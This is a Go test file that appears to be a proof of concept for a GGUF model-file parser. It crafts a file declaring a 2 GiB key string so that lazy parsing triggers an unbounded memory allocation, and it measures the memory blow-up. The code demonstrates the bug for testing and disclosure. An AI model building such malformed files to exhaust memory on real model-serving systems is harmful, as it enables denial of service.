package gguf

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"testing"
)

// TestPocLazyUnboundedStringAlloc triggers readString via the lazy parser's
// keyValues.next() (the path used by Capabilities()/api/show).
func TestPocLazyUnboundedStringAlloc(t *testing.T) {
	var mem1, mem2 runtime.MemStats
	runtime.ReadMemStats(&mem1)
	fmt.Printf("Before: HeapAlloc=%d MiB Sys=%d MiB\n", mem1.HeapAlloc>>20, mem1.Sys>>20)

	var buf bytes.Buffer

	// Magic: uppercase "GGUF" passes the "not-lowercase-gguf" check in Open.
	buf.Write([]byte("GGUF"))
	binary.Write(&buf, binary.LittleEndian, uint32(3)) // version >= 2 OK
	// Per the lazy parser: Open reads tensorCount then kvCount (see Open()).
	binary.Write(&buf, binary.LittleEndian, uint64(0)) // tensorCount
	binary.Write(&buf, binary.LittleEndian, uint64(1)) // kvCount

	// First KV: key string length = attacker-controlled huge value.
	maliciousLen := uint64(2 << 30) // 2 GiB
	fmt.Printf("Declared string length: %d MiB\n", maliciousLen>>20)
	binary.Write(&buf, binary.LittleEndian, maliciousLen)

	buf.WriteString("hi")
	fmt.Printf("Blob size: %d bytes\n", buf.Len())

	tmp, err := os.CreateTemp("", "gguf-lazy-poc-*.bin")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmp.Name())
	tmp.Write(buf.Bytes())
	tmp.Close()

	defer func() {
		if r := recover(); r != nil {
			runtime.ReadMemStats(&mem2)
			fmt.Printf("PANIC RECOVERED: %v\n", r)
			fmt.Printf("After panic: Sys=%d MiB (delta=%d MiB)\n",
				mem2.Sys>>20, (mem2.Sys-mem1.Sys)>>20)
		}
	}()

	fmt.Println("Calling Open...")
	f, err := Open(tmp.Name())
	fmt.Printf("Open returned err=%v\n", err)
	if err == nil && f != nil {
		fmt.Println("Calling KeyValue('pooling_type') — triggers lazy parse...")
		_ = f.KeyValue("pooling_type")
		f.Close()
	}

	runtime.ReadMemStats(&mem2)
	fmt.Printf("After: HeapAlloc=%d MiB Sys=%d MiB (delta sys=%d MiB)\n",
		mem2.HeapAlloc>>20, mem2.Sys>>20, (mem2.Sys-mem1.Sys)>>20)
}
